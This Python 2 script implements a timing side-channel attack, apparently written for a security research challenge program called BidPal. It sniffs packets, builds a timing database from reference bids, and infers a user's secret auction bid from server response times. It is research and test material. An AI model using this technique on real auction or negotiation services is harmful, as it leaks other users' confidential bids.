from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
import subprocess
import time
import sys
import numpy
import traceback
import random
import json
import argparse
import packetcollector
import processcommspackets
import pexpect

bin_dir = "../../../challenge_program/bin"

def median(lst):
    return numpy.median(lst)

class BidPalAttack:
    MAX_BID = 500

    def time_bid_responses(self, profile, interface):
        #print "timing bid responses for " + profile + " on interface " + interface
        with  packetcollector.PacketCollector(interface, "tcp port 9003" ) as packet_collector: #"tcp port {}".format("9000")
            p =pexpect.spawn("./auction.sh " + profile)
            p.wait()
            time.sleep(5)
            packet_collector.stop()
            time.sleep(1)
            times = self.parse_pcap(packet_collector.get_pcap(), "127.0.0.1", "9003")
            return times




    def make_guess(self, times):

        ref_bid = self.get_closest(self.ref_times, median(times))
        ref_time = median(self.ref_times[ref_bid])
        t = median(times)
        # interpolate actual bid from reference bids
        guess = ref_bid + (ref_time-t)/self.avg_delta
        # make sure guess is in acceptable range
        if guess<0:
            guess = 0
        if guess>self.MAX_BID:
            guess=self.MAX_BID
        return guess

    def get_closest(self, refs, mine):
        closest = False
        for bid in refs:
            time = median(refs[bid])
            if closest == False:
                closest = time
                closest_bid = bid
            elif abs(closest-mine) > abs(time -mine):
                closest = time
                closest_bid = bid
        return closest_bid


    def gather_stats(self, interface):
        self.ref_bids = [500, 250, 0]
        self.ref_times = self.collect_times( interface, self.ref_bids)
        # compute avg time diff per dollar
        diffs = []
        for i in range(len(self.ref_times)-1):
            timeiplus1 = median(self.ref_times[self.ref_bids[i+1]])
            timei = median(self.ref_times[self.ref_bids[i]])
            bidplus = self.ref_bids[i+1]
            bidi = self.ref_bids[i]
            delta = (timei - timeiplus1)/float(bidplus - bidi)
            diffs.append(delta)
        self.avg_delta = sum(diffs)/float(len(diffs))


    def collect_times(self, interface, ref_bids):
        count = 1
        times = {} # list of times for each bid value
        # record times for various bids
        for bid in ref_bids:
	    print "timing " + str(bid)
            times[bid] = self.time_bid_responses("profile_sell"+str(bid) + ".json", interface)
            count+=1
        return times

    # only looking at messages sent by server
    def get_comparison_times(self, nsmsgs):
        last_msg=None
        deltas = []
        for msg in nsmsgs:
            if not msg.is_client(): # server message
                if last_msg!=None:
                    if last_msg.get_size() < 100 and msg.get_size() > 10000: # bid receipt and bid comparison!
                        deltas.append(msg.get_start() - last_msg.get_start())
                last_msg = msg
        return deltas



    # pick out elapsed time from bid commitment received at serverPort to response sent
    def parse_pcap(self, pcap, serverAddr, serverPort):
        serverPort = int(serverPort)
        times = [] # times from send of bid commitment to receipt of bid comparison msg

        conversations = processcommspackets.get_conversations(pcap, serverAddr, serverPort)

        for id, conversation in conversations.items():
            nonsetupMsgs = conversation.get_messages_without_setup()
            deltas = self.get_comparison_times(nonsetupMsgs)

            times.extend(deltas) # Note: if there was more than one auction in the pcap, we need to split this up
        return times


    def load(self, db_filename):
        with open(db_filename, 'r') as reader:
            tempDict = json.load(reader)
            # Note: json has turned our ints into strings, so we have to convert them back

            self.ref_bids = tempDict["ref_bids"]
            self.avg_delta = float(tempDict["avg_delta"])
            ref_times = tempDict["ref_times"]
            self.ref_times = {}
            for (key, val) in ref_times.iteritems(): # json turned the keys into strings -- fix
                self.ref_times[int(key)] = val
            print "loaded stats from " + db_filename

    def save(self, db_filename):
        '''
        Saves the database to the file/tmp/tmpnwX6Jx

        '''
        #print "saving stats to " + db_filename
        with open(db_filename, 'w') as writer:
            dic = {"ref_bids" : self.ref_bids,
                   "ref_times" : self.ref_times,
                   "avg_delta" : self.avg_delta}

            json.dump(dic, writer)



if __name__=="__main__":
    attack = BidPalAttack()
    try:
        parser = argparse.ArgumentParser()
        #
        subparsers = parser.add_subparsers(dest="command")
        buildparser = subparsers.add_parser('build', help='Build a new database')
        buildparser.add_argument("interface", help="network interface on which to listen", default="eth0")
        buildparser.add_argument("pcap", help="pcap of user activity from which we want to guess bid")
        buildparser.add_argument("outfile", help="specify the filename for the database to build")


        attackparser = subparsers.add_parser('attack', help="guess a single bid via pcap")
        attackparser.add_argument("pcap", help="pcap of user activity from which we want to guess bid")
        attackparser.add_argument("host", help="host of the user whose bid is to be guessed")
        attackparser.add_argument('port', help="port of the user whose bid is to be guessed")
        attackparser.add_argument("db", help="stored timings database")

        args = parser.parse_args()
        if args.command == 'build':
    	    print "in python build"
	    attack.gather_stats(args.interface)
            attack.save(args.outfile)

        elif args.command == "attack":
            attack.load(args.db)
            packets = processcommspackets.read_pcap(args.pcap)
            times = attack.parse_pcap(packets, args.host, args.port)
            guess = attack.make_guess(times)
            print str(int(guess))

    except:
        print "error"
        traceback.print_exc()

